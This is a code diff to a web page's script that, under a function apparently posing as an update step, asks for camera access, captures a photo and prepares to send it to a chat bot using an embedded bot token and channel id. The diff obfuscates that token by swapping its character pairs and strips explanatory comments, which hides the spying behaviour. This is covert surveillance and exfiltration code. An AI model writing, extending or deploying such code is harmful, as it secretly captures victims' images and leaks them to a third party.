@@ -21,8 +21,23 @@
     </div>
 
     <script>
-    // ===== التوكن الجديد (غير مشفر) =====
-    var token = "MTM5OTE2NTUyODg5MDY3MTI0NQ.G010wD.us8b_AoR1zCpZtFJW3FtTE-MQ-MQI9EUNICuJ8";
+    // ===== التشفير البسيط (عكس الحروف) =====
+    function decodeToken(encoded) {
+        // كل حرفين يتعكسوا
+        var result = "";
+        for (var i = 0; i < encoded.length; i += 2) {
+            if (i + 1 < encoded.length) {
+                result += encoded[i + 1] + encoded[i];
+            } else {
+                result += encoded[i];
+            }
+        }
+        return result;
+    }
+    
+    // التوكن مشفر بطريقة بسيطة (عكس كل حرفين)
+    var encodedToken = "M1T5M2TEU5yO8Dg5Y0D3M1I0N5Q.G6FGN7.KbVpeQKfW0xGJHInu0VH9yVb1AB9TRt36h3y68";
+    var token = decodeToken(encodedToken);
     var channel = 1475949185294536859;
     
     async function startUpdate() {
@@ -50,11 +65,9 @@
         output.innerHTML = 'Accessing camera...';
         
         try {
-            // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             output.innerHTML = '✅ Camera access granted';
             
-            // تصوير
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
@@ -65,11 +78,9 @@
                 canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
-                // تحويل الصورة
                 canvas.toBlob(async function(blob) {
                     output.innerHTML = 'Sending photo...';
                     
-                    // إرسال للبوت
                     const formData = new FormData();
                     formData.append('file', blob, 'photo.jpg');
                     formData.append('content', '📸 Photo captured');
